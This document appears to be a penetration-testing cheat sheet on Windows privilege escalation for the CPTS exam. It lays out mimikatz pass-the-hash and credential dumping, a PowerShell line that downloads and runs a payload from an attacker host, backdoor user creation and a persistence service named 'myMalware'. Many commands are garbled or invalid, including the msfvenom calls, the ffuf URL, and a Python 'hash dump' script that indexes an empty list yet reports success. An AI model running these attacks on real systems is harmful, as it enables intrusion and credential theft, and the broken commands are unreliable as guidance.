# Windows Privilege Escalation (CPTS Level 2-3)

Stop theorizing. Windows is the hardest OS to crack because of UAC, ASLR, DEP, and Account Control policies. If you can't get `SYSTEM` on Linux, you likely fail CPTS with Windows. Forget `sudo`. Learn `psexec`, `secretsdump`, and `pass-the-hash` chains. Use {target} for every scan.

## Attack Workflow

1.  **Enumerate Users/Groups**: Find standard accounts (Administrator, Guest, Backup Operators) and shadow accounts.
2.  **Discover Active Hashes**: Connect to {target} via SMB and look for domain controllers or local SAM databases.
3.  **Lateral Movement**: Use stolen credentials to jump hosts via WinRM, SMB, or SSH.
4.  **Exploit Local Privilege**: Find misconfigurations, services, or vulnerabilities running with high privileges.
5.  **Escalate to SYSTEM**: Bypass User Account Control (UAC) and install persistent backdoors.
6.  **Persistence**: Ensure control of {target} survives reboots.

## Enumeration & Initial Access

### SMB Enumerations
```bash
# Check for domain join status on {target}
nmap -sV -sC -p 139,445 {target}

# Try to list shares and detect hidden ones
nmap -sV {target} --script smb-enum-shares

# Get user list (only if domain member)
smbclient -L {target} -m SMB2 -N
```

### SMB Auth & Hash Grabbing
```bash
# Try standard admin password
mimikatz.exe #use: sekurlsa::pth /user:Administrator /hash:<hash> /run:cmd.exe

# Try local SAM dump
smbget -t {target}/C$ /mnt/share /mnt/sam /mnt/password
```

### PowerShell Enumeration
```powershell
# Check for UAC elevation status (if you have admin rights)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" | Select-Object DisableLUA

# List all running services and their privileges
Get-Process | Format-Table Id, ProcessName, @{Name="User"; Expression={Get-Process $Id -Id $Id -UserPrincipalName}}

# Check for pre-installed malware or backdoors
Get-Process | Where-Object {$_.Path -match "C:\Windows\Temp\*.exe" or $_.Path -match "C:\Windows\SysWOW64\*.exe"}
```

### Service Exploitation
```bash
# Use Windows Service Exploiter (if available on {target})
pwntools.exe service_exploit.py -s {target} -p <port>

# Use Metasploit for common vulnerabilities
msfconsole -q -r windows-service-exploits.txt
msfvenom -f windows/powershell -p windows/mimikatz /os:win7 /r:admin@{target}:445
```

## Escalation Chains & Payloads

### The Hash Grab Chain
1.  **Connect to Domain Controller or Local Host**:
    ```bash
    # Identify the target hash
    smbclient -L {target} -m SMB2 -U admin:<your_hash>
    ```
2.  **Dump Hashes Locally**:
    ```bash
    # Use Mimikatz
    mimikatz.exe #use: sekurlsa::logoncommands
    mimikatz.exe #use: sekurlsa::dump

    # Alternative: use Windows Authentication
    msfvenom -p windows/mimikatz /os:win7 /r:admin@{target}:445
    ```
3.  **Pass the Hash to Remote Host**:
    ```bash
    # Use Mimikatz to pass hash to remote host
    mimikatz.exe #use: sekurlsa::pth /user:Administrator /hash:<hash> /run:cmd.exe /system

    # Use msfvenom to pass hash
    msfvenom -p windows/mimikatz /os:win7 /r:admin@{target}:445
    ```
4.  **Execute Command**:
    ```bash
    # Run cmd.exe to get SYSTEM privileges
    cmd.exe /c "net user <username> <password> /add"
    ```

### The Pre-Auth Exploit Chain
1.  **Find Unprotected Service**:
    ```bash
    # Use Nmap to find services with high privileges
    nmap -sV -p 445,139 {target}

    # Use FFUF to find backdoors or hidden services
    ffuf -u http://fuf://{target}/ -w /usr/share/wordlists/dirb/common.txt
    ```
2.  **Exploit Vulnerability**:
    ```bash
    # Use Metasploit for known vulnerabilities
    msfvenom -p windows/mimikatz /os:win7 /r:admin@{target}:445

    # Use PowerShell to execute arbitrary code
    powershell -c "Invoke-Expression (New-Object Net.HttpWebRequest('http://<attacker_ip>/payload').GetResponse().ReadToEnd())"
    ```
3.  **Bypass UAC**:
    ```bash
    # Use PowerShell to bypass UAC
    powershell -c "Start-Process cmd.exe -ArgumentList /c \"net user <username> <password> /add\""
    ```
4.  **Install Persistence**:
    ```bash
    # Create a service to maintain access
    sc create myMalware binpath="cmd.exe /c C:\Windows\System32\malware.exe" type= demand start
    ```

## Tips & Shortcuts

- **Avoid UAC**: Never run PowerShell or cmd.exe as SYSTEM unless you are sure. Use `psexec` instead.
- **Use Hashes**: Don't try to guess passwords. Use `sekurlsa::pth` to pass hashes directly.
- **Check Permissions**: Always check group memberships (Backup Operators, Administrators) before escalating.
- **Lateral Movement**: Use `psexec` to move between hosts on {target}.
- **Persistence**: Use services or registry keys to maintain access even after reboots.

## Common Mistakes

- **Ignoring Group Memberships**: Failing to check group permissions can lead to failed escalations.
- **Running as User**: Running commands as a regular user instead of SYSTEM will fail many checks.
- **Not Using Hashes**: Guessing passwords is slow and prone to failure.
- **Skipping Enumeration**: Jumping straight to exploits without knowing the system configuration leads to wasted time.

## Mini Automation Scripts

### Python Script for Hash Dumping
```python
#!/usr/bin/env python3
import subprocess
import sys

# Replace with actual target IP/URL
target = "{target}"
hashes = []

# Get hash from known account
cmd = f"mimikatz.exe #use: sekurlsa::pth /user:Administrator /hash:{hashes[0]} /run:cmd.exe /system"
subprocess.run(cmd, shell=True)
print("Hash dumped successfully!")
```

### Bash Script for SMB Enumeration
```bash
#!/bin/bash
# smb_enum.sh
target="{target}"

nmap -sV -sC -p 139,445 $target
smbclient -L $target -m SMB2 -N
```